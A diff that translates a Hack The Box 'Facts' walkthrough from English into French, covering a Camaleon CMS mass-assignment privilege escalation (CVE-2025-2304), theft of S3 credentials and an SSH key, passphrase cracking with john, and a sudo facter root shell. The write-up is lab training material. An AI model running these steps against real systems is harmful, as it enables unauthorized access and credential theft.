@@ -16,13 +16,17 @@ type: "post"
 * OS: Linux
 ---
 
+Facts débute par la découverte d'une instance vulnérable du CMS Camaleon affectée par la faille `CVE-2025-2304`, où une faille de type `mass assignment` permet l'escalade des privilèges vers le niveau administrateur. L'accès au tableau de bord du CMS révèle des identifiants MinIO compatibles avec AWS, qui sont utilisés pour recenser les compartiments S3 internes et récupérer une clé privée SSH.
+
+Après avoir cracké la phrase de passe de la clé SSH avec John the Ripper, l'accès est obtenu en tant qu'utilisateur `trivia` via SSH. L'énumération du système identifie ensuite que le binaire `facter` peut être exécuté avec des privilèges sudo, permettant l'exécution de code Ruby arbitraire via l'argument `--custom-dir` et conduisant finalement à une compromission totale de la cible.
+
 # Balayage
 
 ```
 nmap -p- --open -T4 -sCV -oA nmap/Facts {TARGET_IP}
 ```
 
-**Results**
+**Résultats**
 
 ```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 12:26 CST
@@ -105,37 +109,35 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 143.77 seconds
 ```
 
+Nmap détecte trois ports ouverts: `SSH` (22), `http` (80) et `MinIO` (54321). Il y a également une redirection vers `facts.htb`.
 
-Nmap finds three open ports: `SSH` (22), `http` (80), and `MinIO` (54321). There is also a redirection to `facts.htb`.
-
-> [MinIO](https://www.min.io/) is a storage system compatible with Amazon S3.
+> [MinIO](https://www.min.io/) est un système de stockage compatible avec Amazon S3.
 
 ```
 sudo echo "{IP} facts.htb" | sudo tee -a /etc/hosts
 ```
 
-# Enumeration
+# Énumération
 
-At `http://facts.htb/` we find a web application.
+À l'adresse `http://facts.htb/`, nous trouvons une application web.
 
 ![Facts website](/images/HTB-Facts/facts_website.png)
 
-The `Start Exploring` button leads us to `http://facts.htb/animal-ejected` to a publication page.
+Le bouton `Start Exploring` nous redirige vers `http://facts.htb/animal-ejected`, une page de publication.
 
 ![bear post](/images/HTB-Facts/bear_post.png)
 
-Clicking on `Page` leads to `http://facts.htb/page` where we find all the available posts on the website.
+En cliquant sur `Page`, on accède à `http://facts.htb/page`, où l'on trouve tous les articles disponibles sur le site web.
 
 ![page section](/images/HTB-Facts/page_section.png)
 
-It is also noticeable that the pictures for the different posts are store in `http://facts.htb/randomfacts/`, we are unable to access it. However,
-we can download images from the website by visiting a picture's specific address such as `http://facts.htb/randomfacts/animalejected.png`.
+On remarque également que les images des différents articles sont stockées dans le répertoire `http://facts.htb/randomfacts/`, auquel nous n'avons pas accès. Cependant, nous pouvons télécharger des images depuis le site web en accédant à l'adresse spécifique d'une image, telle que `http://facts.htb/randomfacts/animalejected.png` par exemple.
 
 ![posts pictures](/images/HTB-Facts/posts_pics.png)
 
 ![images directory](/images/HTB-Facts/image_dir.png)
 
-Through directory brute forcing we find a login page at `http://facts.htb/admin/login`.
+En effectuant une attaque par force brute sur les répertoires, nous trouvons une page de connexion à l'adresse: `http://facts.htb/admin/login`.
 
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://facts.htb
@@ -145,39 +147,39 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 
 ![admin page](/images/HTB-Facts/admin_page.png)
 
-We are able to create an account an login. Camaleon CMS is used here specifically version `2.9.0`.
+Nous créons un compte et nous nous connectons. Camaleon CMS est utilisé ici, plus précisément la version `2.9.0`.
 
 ![camaleonCMS dashboard](/images/HTB-Facts/camaleonCMS_dashboard.png)
 
-Looking for Camaleon CMS vulnerabilities, we find [CVE-2025-2304](https://www.tenable.com/security/research/tra-2025-09). It is a privilege escalation vulnerability via mass assignment. It happens when a user tries to change its password. By submitting a request including the `role` parameter we are able to gain admin privileges. 
+En recherchant les vulnérabilités du CMS Camaleon, nous découvrons le [CVE-2025-2304](https://www.tenable.com/security/research/tra-2025-09). Il s'agit d'une vulnérabilité d'élévation de privilèges via une affectation massive. Elle se produit lorsqu'un utilisateur tente de modifier son mot de passe. En envoyant une requête contenant le paramètre `role`, il est possible d'obtenir des privilèges d'administrateur. 
 
-> Go to your profile page to see the option.
+> Rendez-vous sur votre page de profil pour voir cette option.
 
 ![change password feature](/images/HTB-Facts/change_pwd.png)
 
-The issue resides in the `UsersController` more precisely the `updated_ajax` action during password changes. The vulnerable code uses the `permit!` method which is dangerous because it tells the system to accept every key inside the `password[...]` object. 
+La faille se trouve dans le `UsersController`, plus précisément dans l'action `updated_ajax` lors des modifications de mot de passe. Le code vulnérable utilise la méthode `permit!`, ce qui est dangereux car elle indique au système d'accepter toutes les clés contenues dans l'objet `password[...]`. 
 
-Because the parameters are passed directly into `@user.update(...)`, any injected field becomes a writable user attribute and since `role` controls a user privileges we only need to include `password[role]=admin` in order to obtain admin privileges.
+Comme les paramètres sont transmis directement à `@user.update(...)`, tout champ injecté devient un attribut utilisateur modifiable et, puisque `role` contrôle les privilèges d'un utilisateur, il suffit d'inclure `password[role]=admin` pour obtenir des privilèges d'administrateur.
 
-> The specific PR is available [here](https://github.com/owen2345/camaleon-cms/pull/1109/changes).
+> La Pull Request en question est disponible [ici](https://github.com/owen2345/camaleon-cms/pull/1109/changes).
 
 ![PR_1109 CamaleonCMS](/images/HTB-Facts/PR_1109.png)
 
-> A PoC of the exploit is available [here](https://github.com/whiteov3rflow/CVE-2025-2304-POC), it automates the process.
+> Une démonstration de faisabilité (PoC) de cette faille est disponible [ici](https://github.com/whiteov3rflow/CVE-2025-2304-POC); elle automatise le processus.
 
 ![admin access](/images/HTB-Facts/admin_access.png)
 
-# Initial Foothold
+# Accès Initial
 
-After logging out and logging in again we now have access to more functionalities.
+Après s'être déconnecté puis reconnecté, nous avons désormais accès à davantage de fonctionnalités.
 
 ![true admin access](/images/HTB-Facts/true_admin.png)
 
-In `Settings` -> `General Site` -> `Filesystem Settings` we find some AWS secrets.
+Dans `Settings` -> `General Site` -> `Filesystem Settings`, on trouve quelques secrets AWS.
 
 ![AWS Secrets](/images/HTB-Facts/AWS_secrets.png)
 
-Using them we enumerate the S3 bucket.
+À partir de ces informations, nous énumérons le bucket S3.
 
 ```
 aws configure --profile facts
@@ -185,7 +187,7 @@ aws configure --profile facts
 
 ![AWS Enumeration](/images/HTB-Facts/AWS_enum_setup.png)
 
-There are two directories in the bucket.
+Le bucket contient deux répertoires.
 
 ```
 aws --profile facts \
@@ -195,7 +197,7 @@ aws --profile facts \
 
 ![AWS buckets](/images/HTB-Facts/bucket_dirs.png)
 
-We already know that `randomfacts` contains the pictures of the website. So we check `internal`.
+Nous savons déjà que `randomfacts` contient les images du site web. Nous vérifions donc `internal`.
 
 ```
 aws --profile facts \
@@ -205,7 +207,7 @@ aws --profile facts \
 
 ![AWS internal directories](/images/HTB-Facts/internal_dir_S3.png)
 
-A SSH key is recovered in `.ssh`.
+Une clé SSH se trouve dans le répertoire `.ssh`.
 
 ```
 aws --profile facts \
@@ -215,7 +217,7 @@ aws --profile facts \
 
 ![SSH key S3](/images/HTB-Facts/S3_ssh_key.png)
 
-We copy the key and use it to login via SSH.
+Nous copions la clé.
 
 ```
 aws --profile facts \
@@ -223,23 +225,23 @@ aws --profile facts \
     s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
 ```
 
-Modify the file permissions with `chmod 600 id_ed25519`.  Let's try interacting with the key.
+Nous modifions les permissions du fichier à l'aide de la commande `chmod 600 id_ed25519`, puis nous commençons à interagir avec la clé.
 
 ```
 ssh-keygen -y -f id_ed25519
 ```
 
-It fails because we still need the passphrase.
+Cela ne fonctionne pas, car il manque encore la passephrase.
 
 ![sshkeygen command](/images/HTB-Facts/sshkeygen.png)
 
-We use `ssh2john` to create a suitable hash.
+Nous utilisons `ssh2john` pour générer un hachage approprié.
 
 ```
 /usr/share/john/ssh2john.py id_ed25519 > id_ed25519.txt
 ```
 
-Then crack it with john and find the passphrase `dragonballz`.
+À l'aide de john, la passephrase `dragonballz` est récupérée.
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.txt
@@ -247,44 +249,44 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.txt
 
 ![ssh key passphrase](/images/HTB-Facts/key_pwd_facts.png)
 
-Running `ssh-keygen -y -f id_ed25519` again we discovered that the key belongs to `trivia`.
+En exécutant à nouveau la commande `ssh-keygen -y -f id_ed25519`, nous découvrons que la clé appartient à `trivia`.
 
-We can now login via SSH 
+Nous connectons maintenant via SSH 
 ```
 ssh -i id_ed25519 trivia@facts.htb
 ```
 
 ![trivia SSH login](/images/HTB-Facts/trivia_SSH.png)
 
-The user `trivia` is able to access `william`'s home directory where we find the user flag.
+L'utilisateur `trivia` peut accéder au répertoire personnel de `william`, où se trouve le drapeau utilisateur.
 
 ![user flag](/images/HTB-Facts/facts_user.png)
 
-# Privilege Escalation
+# Élévation des privilèges
 
-Running `sudo -l` we notice that `facter` is executable as `root`. On [GTFObins](https://gtfobins.org/gtfobins/facter/) we find a way to exploit the binary. Whenever the binary is run with the `--custom-dir` argument the first ruby file in the directory is executed. We can abuse it to get a shell with root privileges.
+En exécutant `sudo -l`, nous remarquons que `facter` est exécutable en tant que `root`. Sur [GTFObins](https://gtfobins.org/gtfobins/facter/), nous trouvons un moyen d'exploiter ce binaire. Chaque fois que le binaire est exécuté avec l'argument `--custom-dir`, le premier fichier Ruby présent dans le répertoire est exécuté. Nous pouvons exploiter cette faille pour obtenir un shell avec des privilèges root.
 
 ![facter binary](/images/HTB-Facts/facter_bin.png)
 
-1. Create a directory
+1. Créer un répertoire
  
 ```
 mkdir /tmp/kscorpio
 ```
 
-2. Create a ruby file in the directory with the following content `exec "/bin/bash"`
+2. Créer un fichier Ruby dans le répertoire avec le contenu suivant: `exec "/bin/bash"`
 
 ```
 nano priv.rb
 ```
 
-3. Execute `facter`
+3. Exécuter `facter`
 
 ```
 sudo /usr/bin/facter --custom-dir /tmp/kscorpio
 ```
 
-We then gain root privileges
+Nous obtenons ensuite les privilèges root.
 
 ![root access](/images/HTB-Facts/root_access.png)
 
